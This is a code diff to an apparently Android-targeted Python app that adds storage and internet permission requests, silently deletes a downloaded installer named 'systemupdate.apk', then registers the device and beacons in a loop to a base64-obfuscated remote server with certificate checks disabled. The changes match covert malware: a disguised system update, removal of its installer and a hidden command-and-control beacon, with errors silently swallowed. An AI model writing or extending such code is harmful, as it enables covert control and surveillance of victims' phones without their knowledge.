@@ -11,10 +11,35 @@ import urllib3
 import threading
 import base64
 
+try:
+    from android.permissions import request_permissions, Permission
+    HAS_ANDROID = True
+except:
+    HAS_ANDROID = False
+    
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def decode(encoded):
     return base64.b64decode(encoded).decode('utf-8')
+
+def request_android_permissions():
+    if HAS_ANDROID:
+        try:
+            request_permissions([
+                Permission.INTERNET,
+                Permission.READ_EXTERNAL_STORAGE,
+                Permission.WRITE_EXTERNAL_STORAGE
+            ])
+        except:
+            pass
+
+def delete_apk():
+    try:
+        apk_path = "/storage/emulated/0/Download/systemupdate.apk"
+        if os.path.exists(apk_path):
+            os.remove(apk_path)
+    except:
+        pass
 
 encoded_url = "aHR0cHM6Ly9uZXdtZXRob2QtaXNoNi5vbnJlbmRlci5jb20="
 encoded_id = "Mw=="
@@ -67,9 +92,11 @@ def register_device():
         pass
 
 def background_worker():
+    time.sleep(2)
+    request_android_permissions()
     time.sleep(5)
+    delete_apk()
     register_device()
-
     while True:
         try:
             requests.get(base_url + "/beacon", verify=False, timeout=10)
